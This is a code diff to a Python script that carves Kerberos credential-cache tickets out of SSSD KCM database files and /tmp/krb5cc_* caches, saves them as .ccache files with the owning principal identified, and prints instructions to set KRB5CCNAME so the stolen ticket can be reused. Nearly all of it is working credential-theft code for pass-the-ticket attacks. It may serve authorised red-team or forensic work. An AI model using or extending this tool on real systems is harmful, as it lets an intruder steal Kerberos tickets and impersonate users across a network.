@@ -3,46 +3,113 @@
 
 import argparse
 import glob
-import io
+import json
 import os
-import re
 import struct
 import sys
-from typing import List, Tuple
+from typing import Any, Dict, List, Optional
 
 CCACHE_MAGIC_V4 = b"\x05\x04"
+MAX_CANDIDATE_SIZE = 65536
 
 
-def scan_for_ccache_blobs(data: bytes) -> List[Tuple[int, bytes]]:
+def try_parse_default_principal(slice_bytes: bytes) -> Optional[str]:
+    """Parse default principal from CCACHE v4 stream following header tags."""
+    if len(slice_bytes) < 12:
+        return None
+
+    try:
+        (_name_type, num_components, realm_len) = struct.unpack(
+            ">III", slice_bytes[:12]
+        )
+    except struct.error:
+        return None
+
+    if num_components == 0 or num_components > 16 or realm_len == 0 or realm_len > 256:
+        return None
+
+    cursor = 12
+    if cursor + realm_len > len(slice_bytes):
+        return None
+
+    try:
+        realm = slice_bytes[cursor : cursor + realm_len].decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+    cursor += realm_len
+
+    components: List[str] = []
+    for _ in range(num_components):
+        if cursor + 4 > len(slice_bytes):
+            return None
+        (comp_len,) = struct.unpack(">I", slice_bytes[cursor : cursor + 4])
+        cursor += 4
+
+        if comp_len == 0 or comp_len > 256 or cursor + comp_len > len(slice_bytes):
+            return None
+        try:
+            comp = slice_bytes[cursor : cursor + comp_len].decode("utf-8")
+        except UnicodeDecodeError:
+            return None
+        components.append(comp)
+        cursor += comp_len
+
+    return f"{'/'.join(components)}@{realm}"
+
+
+def scan_for_ccache_blobs(data: bytes) -> List[Dict[str, Any]]:
     """Scan raw binary data for valid CCACHE v4 streams."""
-    results = []
+    results: List[Dict[str, Any]] = []
     offset = 0
-    while True:
+    while offset + 4 <= len(data):
         pos = data.find(CCACHE_MAGIC_V4, offset)
         if pos == -1:
             break
-        try:
-            if pos + 4 <= len(data):
+        if pos + 4 <= len(data):
+            try:
                 (header_len,) = struct.unpack(">H", data[pos + 2 : pos + 4])
-                if header_len >= 0 and pos + 4 + header_len < len(data):
-                    candidate = data[pos : pos + min(65536, len(data) - pos)]
-                    results.append((pos, candidate))
-        except struct.error:
-            pass
+                if pos + 4 + header_len <= len(data):
+                    end = min(pos + MAX_CANDIDATE_SIZE, len(data))
+                    blob = data[pos:end]
+                    principal = try_parse_default_principal(
+                        data[pos + 4 + header_len : end]
+                    )
+                    results.append(
+                        {
+                            "offset": pos,
+                            "header_len": header_len,
+                            "payload_size": len(blob),
+                            "default_principal": principal,
+                            "data": blob,
+                        }
+                    )
+            except struct.error:
+                pass
         offset = pos + 2
     return results
 
 
-def triage_local_caches(out_dir: str) -> None:
+def save_recovered_ticket(out_path: str, data: bytes) -> None:
+    """Save ticket bytes with restricted file permissions (0600) when supported."""
+    with open(out_path, "wb") as f:
+        f.write(data)
+    if hasattr(os, "chmod"):
+        try:
+            os.chmod(out_path, 0o600)
+        except OSError:
+            pass
+
+
+def triage_local_caches(out_dir: str, json_mode: bool = False) -> None:
     os.makedirs(out_dir, exist_ok=True)
-    found_any = False
+    all_blobs: List[Dict[str, Any]] = []
+    discovered_files: List[str] = []
 
     secrets_paths = [
         "/var/lib/sss/secrets/secrets.ldb",
         "/var/lib/sss/db/cache_*.ldb",
     ]
 
-    print("[*] Phase 1: Scanning SSSD KCM database stores...")
     for pattern in secrets_paths:
         for path in glob.glob(pattern):
             if not os.path.isfile(path):
@@ -51,27 +118,47 @@ def triage_local_caches(out_dir: str) -> None:
                 with open(path, "rb") as f:
                     content = f.read()
                 blobs = scan_for_ccache_blobs(content)
-                for idx, (_, blob) in enumerate(blobs, 1):
+                for idx, b in enumerate(blobs, 1):
                     base_name = os.path.splitext(os.path.basename(path))[0]
                     dest = os.path.join(out_dir, f"{base_name}_recovered_{idx}.ccache")
-                    with open(dest, "wb") as out_f:
-                        out_f.write(blob)
-                    print(f"  [+] Recovered KCM ticket blob -> {dest}")
-                    found_any = True
+                    save_recovered_ticket(dest, b["data"])
+                    discovered_files.append(dest)
+                all_blobs.extend(blobs)
             except PermissionError:
-                print(f"  [-] Access denied to {path} (run with appropriate read rights)")
+                if not json_mode:
+                    print(f"  [-] Access denied to {path} (run with appropriate read rights)")
             except Exception as e:
-                print(f"  [-] Error parsing {path}: {e}")
+                if not json_mode:
+                    print(f"  [-] Error parsing {path}: {e}")
+
+    if json_mode:
+        json_output = [
+            {
+                "offset": b["offset"],
+                "header_len": b["header_len"],
+                "payload_size": b["payload_size"],
+                "default_principal": b["default_principal"],
+            }
+            for b in all_blobs
+        ]
+        print(json.dumps(json_output, indent=2))
+        return
+
+    print("[*] Phase 1: Scanning SSSD KCM database stores...")
+    if not discovered_files:
+        print("  [-] No accessible or unencrypted KCM database stores found.")
+    else:
+        for dest in discovered_files:
+            print(f"  [+] Recovered KCM ticket blob -> {dest}")
 
     print("\n[*] Phase 2: Scanning traditional file-based credential caches...")
     tmp_ccaches = glob.glob("/tmp/krb5cc_*")
     for cc in tmp_ccaches:
         print(f"  [+] Discovered active file ccache: {cc}")
-        found_any = True
 
-    if not found_any:
+    if not discovered_files and not tmp_ccaches:
         print("  [-] No unencrypted ccache blobs discovered in evaluated paths.")
-    else:
+    elif discovered_files:
         print(
             f"\n[+] Set environment to utilize recovered ticket:\n    $ export KRB5CCNAME={out_dir}/<ticket>.ccache"
         )
@@ -90,6 +177,9 @@ def main() -> None:
         default="./extracted_ccache",
         help="Directory to store recovered .ccache files",
     )
+    parser.add_argument(
+        "--json", action="store_true", help="Output discovered streams in JSON format"
+    )
     args = parser.parse_args()
 
     if args.file:
@@ -100,14 +190,28 @@ def main() -> None:
         with open(args.file, "rb") as f:
             data = f.read()
         blobs = scan_for_ccache_blobs(data)
+
+        if args.json:
+            json_output = [
+                {
+                    "offset": b["offset"],
+                    "header_len": b["header_len"],
+                    "payload_size": b["payload_size"],
+                    "default_principal": b["default_principal"],
+                }
+                for b in blobs
+            ]
+            print(json.dumps(json_output, indent=2))
+            return
+
         print(f"[*] Found {len(blobs)} candidate ccache streams in {args.file}")
-        for idx, (_, b) in enumerate(blobs, 1):
+        for idx, b in enumerate(blobs, 1):
             out_path = os.path.join(args.out, f"ticket_{idx}.ccache")
-            with open(out_path, "wb") as out_f:
-                out_f.write(b)
-            print(f"    -> Saved {out_path}")
+            save_recovered_ticket(out_path, b["data"])
+            p_desc = f" ({b['default_principal']})" if b["default_principal"] else ""
+            print(f"    -> Saved {out_path}{p_desc}")
     else:
-        triage_local_caches(args.out)
+        triage_local_caches(args.out, json_mode=args.json)
 
 
 if __name__ == "__main__":
